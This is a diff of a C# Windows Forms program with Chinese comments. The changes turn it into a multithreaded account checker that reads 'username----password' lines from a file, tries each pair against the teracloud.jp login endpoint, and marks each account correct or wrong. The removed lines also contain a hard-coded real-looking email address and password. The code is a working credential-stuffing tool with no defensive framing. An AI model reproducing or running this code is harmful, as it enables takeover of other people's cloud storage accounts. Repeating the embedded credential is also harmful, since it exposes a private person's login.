@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -140,22 +141,20 @@ namespace main._2019_6
 
         private void button1_Click(object sender, EventArgs e)
         {
-            string html = method.GetUrl("https://dropbox.com","");
-            if (html == "")
-            {
-                MessageBox.Show("请求失败，网络错误！");
-                return;
-            }
 
-            Thread thread = new Thread(new ThreadStart(run2));
-            thread.Start();
-            Control.CheckForIllegalCrossThreadCalls = false;
-            label1.Text = "软件已经开始运行请勿重复点击....";
+            for (int i = 0; i < Convert.ToInt32(textBox2.Text); i++)
+            {
+                Thread thread = new Thread(new ThreadStart(run2));
+                thread.Start();
+                Control.CheckForIllegalCrossThreadCalls = false;
+            }
+           
+           
         }
 
 
 
-
+        ArrayList finishes = new ArrayList();
         public void run2()
         {
             if (textBox1.Text == "")
@@ -168,29 +167,39 @@ namespace main._2019_6
             //一次性读取完 
             string texts = sr.ReadToEnd();
             string[] text = texts.Split(new string[] { "\r\n" }, StringSplitOptions.None);
-            for (int i = 0; i < text.Length; i++)
+            for (int i = 0; i < text.Length-1; i++)
             {
-                string[] zhanghao = text[i].Split(new string[] { "-" }, StringSplitOptions.None);
-                ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString()); //使用Listview展示数据         
-                lv1.SubItems.Add(zhanghao[0]);
-                lv1.SubItems.Add(zhanghao[1]);
-                lv1.SubItems.Add("未验证");
+                if (!finishes.Contains(text[i]))
+                {
+                    finishes.Add(text[i]);
+                    string[] zhanghao = text[i].Split(new string[] { "----" }, StringSplitOptions.None);
+                    if (zhanghao.Length > 1)
+                    {
+                        string html = method.GetUrl("https://teracloud.jp/en/index.php?cmd=user&password=" + zhanghao[1] + "&pcmd=login&userid=" + zhanghao[0], "utf-8");
+                        if (html.Contains("firstname"))
+                        {
+                            ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString()); //使用Listview展示数据         
+                            lv1.SubItems.Add(zhanghao[0]);
+                            lv1.SubItems.Add(zhanghao[1]);
+                            lv1.SubItems.Add("正确");
+                        }
+                        else
+                        {
+                            ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString()); //使用Listview展示数据         
+                            lv1.SubItems.Add(zhanghao[0]);
+                            lv1.SubItems.Add(zhanghao[1]);
+                            lv1.SubItems.Add("错误");
+
+                        }
+                        while (this.zanting == false)
+                        {
+                            Application.DoEvents();//如果loader是false表明正在加载,,则Application.DoEvents()意思就是处理其他消息。阻止当前的队列继续执行。
+                        }
+                    }
+                }
             }
 
-            for (int i = 0; i < listView1.Items.Count; i++)
-            {
-                if (listView1.Items[i].SubItems[1].Text == "charming0338@naver.com" && listView1.Items[i].SubItems[2].Text == "sexy10518")
-                {
-                    listView1.Items[i].SubItems[3].Text = "正确";
-                }
-                else
-                {
-                    listView1.Items[i].SubItems[3].Text = "已验证,不正确";
-                }
-
-                Thread.Sleep(1000);
-
-            }
+          
 
 
         }
